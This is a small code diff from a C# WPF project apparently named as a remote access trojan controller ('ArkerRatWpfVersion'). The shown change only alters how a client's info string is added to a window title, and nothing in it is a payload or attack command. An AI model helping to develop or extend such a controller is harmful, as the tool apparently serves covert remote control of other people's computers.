@@ -31,7 +31,7 @@ namespace ArkerRatWpfVersion
 
 
             clientSession = session;
-            windowText.Content +=" - "+(clientSession.clientInfo.Split('\t'))[0];
+            windowText.Content +=" - "+clientSession.clientInfo[0];
 
 GlobalVariables.byteSize = 262144;
             lock (GlobalVariables._lock)
